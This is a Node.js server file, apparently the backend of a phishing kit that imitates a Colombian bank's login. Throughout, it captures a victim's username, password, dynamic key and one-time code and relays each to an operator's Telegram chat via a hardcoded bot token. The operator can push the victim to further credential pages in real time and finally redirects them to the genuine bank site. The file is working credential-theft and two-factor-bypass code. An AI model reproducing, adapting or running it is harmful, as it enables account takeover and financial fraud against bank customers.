const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIO(server);

// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = '8370283142:AAHUApAndj1TW2KCWrP-S6Nqg8_dJoT5fdc';
const TELEGRAM_CHAT_ID = '-5032439528';
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Middleware
app.use(express.static(__dirname));
app.use(express.json());

// Almacenamiento en memoria de sesiones
const sessions = new Map();

// Rutas
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/password', (req, res) => {
    res.sendFile(path.join(__dirname, 'password.html'));
});

app.get('/dynamic', (req, res) => {
    res.sendFile(path.join(__dirname, 'dynamic.html'));
});

app.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

// Socket.IO - Manejo de conexiones
io.on('connection', (socket) => {
    console.log('Cliente conectado:', socket.id);

    // Asignar ID de sesión único
    const sessionId = uuidv4();
    socket.sessionId = sessionId;
    sessions.set(sessionId, { socketId: socket.id, data: {} });

    socket.emit('session-created', { sessionId });

    // Manejar reconexión con sesión existente
    socket.on('reconnect-session', (data) => {
        const session = sessions.get(data.sessionId);
        if (session) {
            session.socketId = socket.id;
            socket.sessionId = data.sessionId;
            console.log('Cliente reconectado con sesión:', data.sessionId);
        }
    });

    // Recibir datos del usuario
    socket.on('send-username', async (data) => {
        const session = sessions.get(data.sessionId);
        if (session) {
            session.data.username = data.username;
            
            const message = `🔐 *NUEVO ACCESO*\n\n` +
                          `👤 *Usuario:* ${data.username}\n` +
                          `🆔 *Sesión:* ${data.sessionId}\n` +
                          `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: '🔑 Pedir Contraseña', callback_data: `request_password_${data.sessionId}` }],
                    [{ text: '🔢 Pedir Dinámica', callback_data: `request_dynamic_${data.sessionId}` }],
                    [{ text: '📱 Pedir OTP', callback_data: `request_otp_${data.sessionId}` }],
                    [{ text: '✅ Finalizar', callback_data: `finalize_${data.sessionId}` }]
                ]
            };

            try {
                const sentMessage = await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
                    parse_mode: 'Markdown',
                    reply_markup: keyboard
                });
                session.data.messageId = sentMessage.message_id;
            } catch (error) {
                console.error('Error enviando mensaje a Telegram:', error);
            }
        }
    });

    // Recibir contraseña
    socket.on('send-password', async (data) => {
        const session = sessions.get(data.sessionId);
        if (session) {
            session.data.password = data.password;
            
            const message = `🔐 *NUEVO ACCESO*\n\n` +
                          `👤 *Usuario:* ${session.data.username}\n` +
                          `🔑 *Contraseña:* ${data.password}\n` +
                          `🆔 *Sesión:* ${data.sessionId}\n` +
                          `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: '🔑 Pedir Contraseña', callback_data: `request_password_${data.sessionId}` }],
                    [{ text: '🔢 Pedir Dinámica', callback_data: `request_dynamic_${data.sessionId}` }],
                    [{ text: '📱 Pedir OTP', callback_data: `request_otp_${data.sessionId}` }],
                    [{ text: '✅ Finalizar', callback_data: `finalize_${data.sessionId}` }]
                ]
            };

            try {
                if (session.data.messageId) {
                    await bot.editMessageText(message, {
                        chat_id: TELEGRAM_CHAT_ID,
                        message_id: session.data.messageId,
                        parse_mode: 'Markdown',
                        reply_markup: keyboard
                    });
                } else {
                    const sentMessage = await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
                        parse_mode: 'Markdown',
                        reply_markup: keyboard
                    });
                    session.data.messageId = sentMessage.message_id;
                }
            } catch (error) {
                console.error('Error enviando mensaje a Telegram:', error);
            }
        }
    });

    // Recibir clave dinámica
    socket.on('send-dynamic', async (data) => {
        const session = sessions.get(data.sessionId);
        if (session) {
            session.data.dynamic = data.dynamic;
            
            const message = `🔐 *NUEVO ACCESO*\n\n` +
                          `👤 *Usuario:* ${session.data.username}\n` +
                          `🔑 *Contraseña:* ${session.data.password}\n` +
                          `🔢 *Dinámica:* ${data.dynamic}\n` +
                          `🆔 *Sesión:* ${data.sessionId}\n` +
                          `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: '🔑 Pedir Contraseña', callback_data: `request_password_${data.sessionId}` }],
                    [{ text: '🔢 Pedir Dinámica', callback_data: `request_dynamic_${data.sessionId}` }],
                    [{ text: '📱 Pedir OTP', callback_data: `request_otp_${data.sessionId}` }],
                    [{ text: '✅ Finalizar', callback_data: `finalize_${data.sessionId}` }]
                ]
            };

            try {
                await bot.editMessageText(message, {
                    chat_id: TELEGRAM_CHAT_ID,
                    message_id: session.data.messageId,
                    parse_mode: 'Markdown',
                    reply_markup: keyboard
                });
            } catch (error) {
                console.error('Error enviando mensaje a Telegram:', error);
            }
        }
    });

    // Recibir OTP
    socket.on('send-otp', async (data) => {
        const session = sessions.get(data.sessionId);
        if (session) {
            session.data.otp = data.otp;
            
            const message = `🔐 *NUEVO ACCESO*\n\n` +
                          `👤 *Usuario:* ${session.data.username}\n` +
                          `🔑 *Contraseña:* ${session.data.password}\n` +
                          `🔢 *Dinámica:* ${session.data.dynamic}\n` +
                          `📱 *OTP:* ${data.otp}\n` +
                          `🆔 *Sesión:* ${data.sessionId}\n` +
                          `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: '🔑 Pedir Contraseña', callback_data: `request_password_${data.sessionId}` }],
                    [{ text: '🔢 Pedir Dinámica', callback_data: `request_dynamic_${data.sessionId}` }],
                    [{ text: '📱 Pedir OTP', callback_data: `request_otp_${data.sessionId}` }],
                    [{ text: '✅ Finalizar', callback_data: `finalize_${data.sessionId}` }]
                ]
            };

            try {
                await bot.editMessageText(message, {
                    chat_id: TELEGRAM_CHAT_ID,
                    message_id: session.data.messageId,
                    parse_mode: 'Markdown',
                    reply_markup: keyboard
                });
            } catch (error) {
                console.error('Error enviando mensaje a Telegram:', error);
            }
        }
    });

    socket.on('disconnect', () => {
        console.log('Cliente desconectado:', socket.id);
    });
});

// Manejo de botones de Telegram
bot.on('callback_query', async (query) => {
    const data = query.data;
    const sessionId = data.split('_').pop();
    const session = sessions.get(sessionId);

    if (!session) {
        await bot.answerCallbackQuery(query.id, { text: 'Sesión expirada' });
        return;
    }

    const socket = io.sockets.sockets.get(session.socketId);

    if (data.startsWith('request_password_')) {
        if (socket) {
            socket.emit('redirect', { page: '/password' });
        }
        await bot.answerCallbackQuery(query.id, { text: '✅ Solicitando contraseña...' });
    } else if (data.startsWith('request_dynamic_')) {
        if (socket) {
            socket.emit('redirect', { page: '/dynamic' });
        }
        await bot.answerCallbackQuery(query.id, { text: '✅ Solicitando clave dinámica...' });
    } else if (data.startsWith('request_otp_')) {
        if (socket) {
            socket.emit('redirect', { page: '/otp' });
        }
        await bot.answerCallbackQuery(query.id, { text: '✅ Solicitando OTP...' });
    } else if (data.startsWith('finalize_')) {
        if (socket) {
            socket.emit('redirect', { page: 'https://www.bmm.com.co/' });
        }
        await bot.answerCallbackQuery(query.id, { text: '✅ Finalizando sesión...' });
        sessions.delete(sessionId);
    }
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
    console.log(`🤖 Bot de Telegram iniciado`);
});
